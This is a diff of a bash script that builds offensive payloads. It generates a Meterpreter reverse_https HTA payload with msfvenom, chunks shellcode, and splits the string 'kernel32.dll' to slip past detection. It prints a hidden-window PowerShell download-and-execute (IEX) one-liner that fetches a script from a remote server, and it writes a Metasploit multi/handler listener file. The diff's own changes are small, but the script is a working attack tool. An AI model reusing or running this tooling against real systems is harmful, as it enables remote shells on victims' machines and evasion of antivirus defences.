@@ -24,7 +24,7 @@ DownloadURL="http://10.0.8.4:8080"
 
 # WEB DELIVERY HTA
 # just raw hta-psh, no need for real options
-hta_exploit="msfvenom -p $payload LHOST=127.0.0.1 LPORT=443 -f hta-psh -o user_settings.hta"
+hta_exploit="msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 -f hta-psh -o user_settings.hta"
 printf "Creating dumb HTA-PSH payload:\n$hta_exploit...\n"
 $hta_exploit
 
@@ -105,9 +105,9 @@ do
     shellcode_chunks[$i]=$(echo ${eleet_shellcode:$y:$chunk_size})
     y=$(($y+$chunk_size))
 done
-printf "DEBUG: shellcode_chunks array are printed:\n"
+printf "DEBUG: shellcode chunks are printed:\n"
 printf "${shellcode_chunks[*]}\n"
-printf "DEBUG: shellcode_chunks array are correct?\n"
+printf "DEBUG: shellcode chunks are correct?\n"
 
 # insert shellcode_chunks before call to encoded shellcode
 for (( x=0; x <=$shellcode_parts; x++))
@@ -155,7 +155,7 @@ sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttp
 printf "Final psh-net usage example:\n"
 printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
-# createing multu handler listener file
+# creating multu handler listener file
 printf "Creating multi handler script file...\n"
 printf "use exploit/multi/handler\n" > multihandler.rc
 printf "set PAYLOAD $payload\n" >> multihandler.rc
